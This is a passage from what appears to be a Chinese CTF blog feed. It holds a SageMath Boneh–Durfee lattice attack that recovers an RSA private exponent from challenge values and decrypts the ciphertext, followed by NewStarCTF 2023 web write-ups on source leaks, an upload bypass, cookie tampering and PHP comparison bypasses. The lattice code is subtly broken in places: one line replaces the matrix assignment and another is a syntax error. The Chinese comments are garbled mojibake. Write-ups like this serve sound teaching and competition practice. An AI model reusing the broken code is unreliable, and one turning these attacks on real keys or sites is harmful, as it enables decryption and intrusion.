class="comment">#å¤šé¡¹å¼ç¯</span></span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u)        <span class="comment">#  u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"> </span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># x-ç§»ä½</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># å•é¡¹å¼ x ç§»ä½åˆ—è¡¨</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials(): <span class="comment">#å¯¹äºå¤šé¡¹å¼ä¸­çš„å•é¡¹å¼ã€‚å•é¡¹å¼ï¼ˆï¼‰ï¼š</span></span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:  <span class="comment"># å¦‚æœå•é¡¹ä¸åœ¨å•é¡¹ä¸­</span></span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># y-ç§»ä½</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># å•é¡¹å¼ y ç§»ä½åˆ—è¡¨</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># æ„é€ æ ¼ B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB(UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#çº¦åŒ–æ ¼çš„åŸå‹</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment">#  #è‡ªåŠ¨åˆ é™¤</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># é‡ç½®ç»´åº¦</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># æ£€æŸ¥å‘é‡æ˜¯å¦æœ‰å¸®åŠ©</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># æ£€æŸ¥è¡Œåˆ—å¼æ˜¯å¦æ­£ç¡®ç•Œå®š</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#BB = BB.BKZ(block_size=25)</span></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># æ›¿æ¢å‘é‡ i å’Œ j -&gt;å¤šé¡¹å¼ 1 å’Œ 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;åœ¨æ ¼ä¸­å¯»æ‰¾çº¿æ€§æ— å…³å‘é‡&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># å¯¹äºi and j, æ„é€ ä¸¤ä¸ªå¤šé¡¹å¼</span></span><br><span class="line"> </span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># ç»“æœ</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == :</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">example</span>():</span></span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># éšæœºç”Ÿæˆæ•°æ®</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line">    <span class="comment">#start_time =time.perf_counter</span></span><br><span class="line">    start =time.clock()</span><br><span class="line">    size=<span class="number">512</span></span><br><span class="line">    length_N = <span class="number">2</span>*size;</span><br><span class="line">    ss=<span class="number">0</span></span><br><span class="line">    s=<span class="number">70</span>;</span><br><span class="line">    M=<span class="number">1</span>   <span class="comment"># the number of experiments</span></span><br><span class="line">    delta = <span class="number">299</span>/<span class="number">1024</span></span><br><span class="line">    <span class="comment"># p =  random_prime(2^512,2^511)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(M):</span><br><span class="line"><span class="comment">#         p =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         q =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         if(p&lt;q):</span></span><br><span class="line"><span class="comment">#             temp=p</span></span><br><span class="line"><span class="comment">#             p=q</span></span><br><span class="line"><span class="comment">#             q=temp</span></span><br><span class="line">        N = <span class="number">64421669931279763032337930351371074312763623230334264672272991963587968145469789623226631192910548697947848779021944177739911084383786634595255436873350170397825307930618697902052402139072111389681839113510986333829074390665317265603346122882832568330112945567680656219994967593371244275156478322204419261819</span></span><br><span class="line">        e = <span class="number">31010691142874094705557092175690153458422282630834301371323563655985170293061551914791533335820551677589839843761852199680128997193432075880230502409814741638209947794142932041357373199521605405986705517942961028228255066560857365694517578822510622110740926010357756915595155038827023753366174321207668419113</span></span><br><span class="line">        c = <span class="number">44228757856694834445202355486356318880471120936109992694489050154150768403667631244534149277159399976972028214341072460353357561691320731420869678207365539080035139895735181119706727564445399237943178679966032596522818504363414526390960660239215638736706163678206959509331192083842100728618312517781111784803</span></span><br><span class="line">        hint1 =  <span class="number">597218086872775768003</span></span><br><span class="line">        hint2 =  <span class="number">836339982627318976124</span></span><br><span class="line"><span class="comment">#         print (&quot;pçœŸå®é«˜&quot;,s,&quot;æ¯”ç‰¹ï¼š&quot;, int(p/2^(512-s)))</span></span><br><span class="line"><span class="comment">#         print (&quot;qçœŸå®é«˜&quot;,s,&quot;æ¯”ç‰¹ï¼š&quot;, int(q/2^(512-s)))</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#         N = p*q;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment"># è§£å¯†æŒ‡æ•°dçš„æŒ‡æ•°( æœ€å¤§0.292)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        m = <span class="number">7</span>   <span class="comment"># æ ¼å¤§å°ï¼ˆè¶Šå¤§è¶Šå¥½/è¶Šæ…¢ï¼‰</span></span><br><span class="line">        t = <span class="built_in">round</span>(((<span class="number">1</span>-<span class="number">2</span>*delta) * m))  <span class="comment"># æ¥è‡ª Herrmann å’Œ May çš„ä¼˜åŒ–</span></span><br><span class="line">        X = floor(N^delta)  <span class="comment"># </span></span><br><span class="line">        Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>)/<span class="number">2</span>^s)    <span class="comment"># å¦‚æœ pã€ q å¤§å°ç›¸åŒï¼Œåˆ™æ­£ç¡®</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(hint1),<span class="built_in">int</span>(hint1)+<span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\n\n\n l=&#x27;</span>,l)</span><br><span class="line">            pM=l;</span><br><span class="line">            p0=pM*<span class="number">2</span>^(size-s)+<span class="number">2</span>^(size-s)-<span class="number">1</span>;</span><br><span class="line">            q0=N/p0;</span><br><span class="line">            qM=<span class="built_in">int</span>(q0/<span class="number">2</span>^(size-s))</span><br><span class="line">            A = N + <span class="number">1</span>-pM*<span class="number">2</span>^(size-s)-qM*<span class="number">2</span>^(size-s);</span><br><span class="line">        <span class="comment">#A = N+1</span></span><br><span class="line">            P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol = <span class="number">1</span> + x * (A + y)  <span class="comment">#æ„å»ºçš„æ–¹ç¨‹</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># Checking bounds</span></span><br><span class="line">            <span class="comment">#if debug:</span></span><br><span class="line">                <span class="comment">#print (&quot;=== æ ¸å¯¹æ•°æ® ===&quot;)</span></span><br><span class="line">                <span class="comment">#print (&quot;* delta:&quot;, delta)</span></span><br><span class="line">                <span class="comment">#print (&quot;* delta &lt; 0.292&quot;, delta &lt; 0.292)</span></span><br><span class="line">                <span class="comment">#print (&quot;* size of e:&quot;, ceil(log(e)/log(2)))  # eçš„bitæ•°</span></span><br><span class="line">                <span class="comment"># print (&quot;* size of N:&quot;, len(bin(N)))          # Nçš„bitæ•°</span></span><br><span class="line">                <span class="comment">#print (&quot;* size of N:&quot;, ceil(log(N)/log(2)))  # Nçš„bitæ•°</span></span><br><span class="line">                <span class="comment">#print (&quot;* m:&quot;, m, &quot;, t:&quot;, t)</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># boneh_durfee</span></span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="comment">##print (&quot;=== running algorithm ===&quot;)</span></span><br><span class="line">                start_time = time.time()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print (&quot;=== solution found ===&quot;)</span></span><br><span class="line">                <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"> </span><br><span class="line">                d_sol = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">                ss=ss+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;pçš„é«˜æ¯”ç‰¹ä¸ºï¼š&quot;</span>,l)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;qçš„é«˜æ¯”ç‰¹ä¸ºï¼š&quot;</span>,qM)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;d=&quot;</span>,d_sol) </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))</span><br><span class="line">            <span class="comment">#break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ss=&quot;</span>,ss)</span><br><span class="line">                            <span class="comment">#end=time.process_time</span></span><br><span class="line">        end=time.clock()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Running time: %s Seconds&#x27;</span>%(end-start))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    example()  </span><br></pre></td></tr></table></figure><p><img src="/images/others/beafc4c5fa7767dde8df4f716745e5b.png" alt="image-20220124192143500"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">64421669931279763032337930351371074312763623230334264672272991963587968145469789623226631192910548697947848779021944177739911084383786634595255436873350170397825307930618697902052402139072111389681839113510986333829074390665317265603346122882832568330112945567680656219994967593371244275156478322204419261819</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">31010691142874094705557092175690153458422282630834301371323563655985170293061551914791533335820551677589839843761852199680128997193432075880230502409814741638209947794142932041357373199521605405986705517942961028228255066560857365694517578822510622110740926010357756915595155038827023753366174321207668419113</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">44228757856694834445202355486356318880471120936109992694489050154150768403667631244534149277159399976972028214341072460353357561691320731420869678207365539080035139895735181119706727564445399237943178679966032596522818504363414526390960660239215638736706163678206959509331192083842100728618312517781111784803</span></span><br><span class="line"></span><br><span class="line">hint1 = <span class="number">597218086872775768003</span></span><br><span class="line"></span><br><span class="line">hint2 = <span class="number">836339982627318976124</span></span><br><span class="line"></span><br><span class="line">d= <span class="number">723139209811695466615412520251642069457719866228119412426018806563095539525831453648719201</span></span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>0xGame2023éƒ¨åˆ†wp</title>
      <link href="/2023/10/23/0xGame2023%E9%83%A8%E5%88%86wp/"/>
      <url>/2023/10/23/0xGame2023%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF 2023 å…¬å¼€èµ›é“ WEEK1</title>
      <link href="/2023/10/09/2023%E6%96%B0%E7%94%9F%E8%B5%9B/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20WEEK1/"/>
      <url>/2023/10/09/2023%E6%96%B0%E7%94%9F%E8%B5%9B/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20WEEK1/</url>
      
        <content type="html"><![CDATA[<h3 id="NewStarCTF-2023-å…¬å¼€èµ›é“-WEEK1"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-WEEK1" class="headerlink" title="NewStarCTF 2023 å…¬å¼€èµ›é“ WEEK1"></a>NewStarCTF 2023 å…¬å¼€èµ›é“ WEEK1</h3><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="WEEK1-WEB-æ³„æ¼çš„ç§˜å¯†"><a href="#WEEK1-WEB-æ³„æ¼çš„ç§˜å¯†" class="headerlink" title="WEEK1|WEB æ³„æ¼çš„ç§˜å¯†"></a>WEEK1|WEB æ³„æ¼çš„ç§˜å¯†</h5><p><a href="http://cd98ca4d-7c72-4499-9cb1-010764aa19de.node4.buuoj.cn:81/robots.txt">http://cd98ca4d-7c72-4499-9cb1-010764aa19de.node4.buuoj.cn:81/robots.txt</a></p><p><a href="http://cd98ca4d-7c72-4499-9cb1-010764aa19de.node4.buuoj.cn:81/www.zip">http://cd98ca4d-7c72-4499-9cb1-010764aa19de.node4.buuoj.cn:81/www.zip</a><br>PART ONE: flag{r0bots_1s_s0_us3ful<br>$PART_TWO = â€œ_4nd_<a href="http://www.zip_1s_s0_d4ng3rous}&quot;/">www.zip_1s_s0_d4ng3rous}&quot;</a>;</p><h5 id="WEEK1-WEB-Begin-of-Upload"><a href="#WEEK1-WEB-Begin-of-Upload" class="headerlink" title="WEEK1|WEB Begin of Upload"></a>WEEK1|WEB Begin of Upload</h5><p>å‰ç«¯æ‹¦æˆª<br><img src="/images/xinshengsai/20231011112418.png" alt="image-20220126203415648"></p><h5 id="WEEK1-WEB-Begin-of-HTTP"><a href="#WEEK1-WEB-Begin-of-HTTP" class="headerlink" title="WEEK1|WEB Begin of HTTP"></a>WEEK1|WEB Begin of HTTP</h5><p><a href="http://node4.buuoj.cn:29356/?ctf=1">http://node4.buuoj.cn:29356/?ctf=1</a><br>base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk<br>æ”¹ä¸€ä¸‹cookie</p><p><img src="/images/xinshengsai/20231011113506.png" alt="image-20220126203415648"></p><h5 id="WEEK1-WEB-ErrorFlask"><a href="#WEEK1-WEB-ErrorFlask" class="headerlink" title="WEEK1|WEB ErrorFlask"></a>WEEK1|WEB ErrorFlask</h5><p><a href="http://e8e7a85b-f054-4efa-8acd-d609723abc02.node4.buuoj.cn:81/?number1=">http://e8e7a85b-f054-4efa-8acd-d609723abc02.node4.buuoj.cn:81/?number1=</a>49&amp;number2=2<br>éšä¾¿ä¼ ä¸ªå‚æ•°ï¼Œæºç æ³„éœ²<br><img src="/images/xinshengsai/20231011113732.png" alt="image-20220126203415648"></p><h5 id="WEEK1-WEB-Begin-of-PHP"><a href="#WEEK1-WEB-Begin-of-PHP" class="headerlink" title="WEEK1|WEB Begin of PHP"></a>WEEK1|WEB Begin of PHP</h5><p>ä»£ç å¾ˆé•¿ï¼Œéƒ½æ˜¯åŸºç¡€çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>])Â &amp;&amp;Â <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;  </span><br><span class="line">Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&quot;=LevelÂ 1=&lt;br&gt;&quot;</span>;  </span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]Â !==Â <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]Â &amp;&amp;Â md5(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>])Â ==Â md5(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;Â Â Â Â Â Â Â Â <span class="variable">$flag1Â </span>=Â <span class="literal">True</span>;  </span><br><span class="line">Â Â Â Â &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">die</span>(<span class="string">&quot;nope,thisÂ isÂ levelÂ 1&quot;</span>);  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag1</span>)&#123;  </span><br><span class="line">Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&quot;=LevelÂ 2=&lt;br&gt;&quot;</span>;  </span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>])Â ===Â sha1(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;Â Â Â Â Â Â Â Â Â Â Â Â <span class="variable">$flag2Â </span>=Â <span class="literal">True</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;  </span><br><span class="line">Â Â Â Â &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">die</span>(<span class="string">&quot;nope,thisÂ isÂ levelÂ 2&quot;</span>);  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag2</span>)&#123;  </span><br><span class="line">Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&quot;=LevelÂ 3=&lt;br&gt;&quot;</span>;  </span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>]))&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(strcmp(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>],file_get_contents(<span class="string">&quot;/flag&quot;</span>))Â ==Â <span class="number">0</span>)&#123;Â Â <span class="comment">//ç”¨[]ç»•è¿‡strcmp</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="variable">$flag3Â </span>=Â <span class="literal">True</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">die</span>(<span class="string">&quot;nope,thisÂ isÂ levelÂ 3&quot;</span>);  </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag3</span>)&#123;  </span><br><span class="line">Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&quot;=LevelÂ 4=&lt;br&gt;&quot;</span>;  </span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]))&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(!is_numeric(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>])Â &amp;&amp;Â <span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]Â &gt;Â <span class="number">2023</span>)&#123;Â Â Â Â Â Â Â Â Â Â Â Â <span class="variable">$flag4Â </span>=Â <span class="literal">True</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">die</span>(<span class="string">&quot;nope,thisÂ isÂ levelÂ 4&quot;</span>);  </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag4</span>)&#123;  </span><br><span class="line">Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&quot;=LevelÂ 5=&lt;br&gt;&quot;</span>;Â Â Â Â extract(<span class="variable">$_POST</span>);  </span><br><span class="line">Â Â Â Â <span class="keyword">foreach</span>(<span class="variable">$_POSTÂ as</span>Â <span class="variable">$var</span>)&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span 